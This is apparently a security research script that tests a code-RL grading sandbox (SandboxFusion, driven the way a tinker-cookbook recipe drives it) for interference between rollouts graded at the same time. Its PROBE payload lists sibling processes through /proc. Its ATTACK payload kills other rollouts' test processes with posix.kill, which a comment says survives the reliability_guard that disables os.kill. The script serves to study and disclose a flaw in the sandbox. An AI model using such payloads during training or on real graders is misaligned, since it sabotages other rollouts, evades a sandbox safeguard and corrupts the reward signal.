"""Cross-rollout interference in SandboxFusion as tinker-cookbook's code_rl recipe runs it.

The payload is the one tinker builds in recipes/code_rl/code_grading.py:
TEST_CODE (run.py) + testing_util.py + test_cases.txt + code.py, posted to
/run_code. A group of 4 rollouts grades concurrently (group_size 4, client
concurrency 4). Usage: python sf_client.py <lcb_utils.py> <url>
"""

import base64
import json
import runpy
import sys
import threading
import time
import urllib.request

lcb = runpy.run_path(sys.argv[1])
URL = sys.argv[2]
TIMEOUT = 6

# a toy problem: read n, print 2n. Six tests.
TESTS = [{"input": f"{i}\n", "output": f"{2 * i}\n", "testtype": "stdin"} for i in range(1, 7)]

HONEST = "import time\ntime.sleep(0.5)\nprint(int(input()) * 2)\n"   # correct, ~3 s for 6 tests

PROBE = r'''
import os
me = os.getpid()
rows = []
for d in os.listdir('/proc'):
    if d.isdigit() and int(d) != me:
        try:
            cmd = open(f'/proc/{d}/cmdline', 'rb').read().replace(b'\0', b' ').decode()[:60]
            cwd = os.readlink(f'/proc/{d}/cwd')
        except Exception:
            continue
        if cmd.startswith('python /tmp'):
            rows.append(f'{d} {cmd} cwd={cwd} files={sorted(os.listdir(cwd))}')
print('\n'.join(rows))
print(int(input()) * 2)
'''

# Kills every other rollout's test process, then solves the problem. Everything it uses
# survives reliability_guard (os.kill is None; posix.kill is not).
ATTACK = r'''
import os, posix, time
me = os.getpid()
mine = os.readlink(f'/proc/{me}/cwd')
import sys
t0 = time.time()
while not hasattr(sys, 'done') and time.time() - t0 < 4:
    for d in os.listdir('/proc'):
        if not d.isdigit() or int(d) == me:
            continue
        try:
            cmd = open(f'/proc/{d}/cmdline', 'rb').read().split(b'\0')
            cwd = os.readlink(f'/proc/{d}/cwd')
        except Exception:
            continue
        if cmd[0].endswith(b'python') and cwd.startswith('/tmp/') and cwd != mine:
            try:
                posix.kill(int(d), 9)
            except Exception:
                pass
    time.sleep(0.05)
sys.done = 1
print(int(input()) * 2)
'''


def grade(code, out, key):
    sample = {"inputs": [t["input"] for t in TESTS], "outputs": [t["output"] for t in TESTS]}
    files = {
        "test_cases.txt": json.dumps({"input_output": json.dumps(sample)}),
        "code.py": code,
        "testing_util.py": lcb["TEST_UTIL"],
    }
    payload = {
        "code": lcb["TEST_CODE"] % {"timeout": TIMEOUT},
        "language": "python",
        "run_timeout": (TIMEOUT + 1) * len(TESTS) + 5,
        "files": {k: base64.b64encode(v.encode()).decode() for k, v in files.items()},
    }
    req = urllib.request.Request(URL, json.dumps(payload).encode(), {"Content-Type": "application/json"})
    t = time.time()
    data = json.load(urllib.request.urlopen(req, timeout=120))
    out[key] = {
        "passed": data.get("status") == "Success",       # what tinker's client returns
        "status": data.get("status"),
        "return_code": (data.get("run_result") or {}).get("return_code"),
        "stdout": ((data.get("run_result") or {}).get("stdout") or "")[-600:],
        "stderr": ((data.get("run_result") or {}).get("stderr") or "")[-300:],
        "seconds": round(time.time() - t, 1),
    }


def group(codes, label):
    out, threads = {}, []
    for i, c in enumerate(codes):
        th = threading.Thread(target=grade, args=(c, out, i))
        th.start()
        threads.append(th)
        time.sleep(0.2)
    for th in threads:
        th.join()
    print(f"\n=== {label}")
    for i in range(len(codes)):
        r = out[i]
        print(f"rollout {i}: passed={r['passed']} status={r['status']} rc={r['return_code']} {r['seconds']}s")
    return out


if __name__ == "__main__":
    group([HONEST] * 4, "4 honest rollouts")
    o = group([HONEST, HONEST, HONEST, PROBE], "3 honest + 1 probe (what the probe's grading output shows)")
    print("--- probe stdout (tinker returns this to the model as check_solution details):")
    print(o[3]["stdout"])
    for rep in range(3):
        group([HONEST, HONEST, HONEST, ATTACK], f"3 honest + 1 attacker, repeat {rep}")
    group([ATTACK, HONEST, HONEST, HONEST], "attacker submits first")
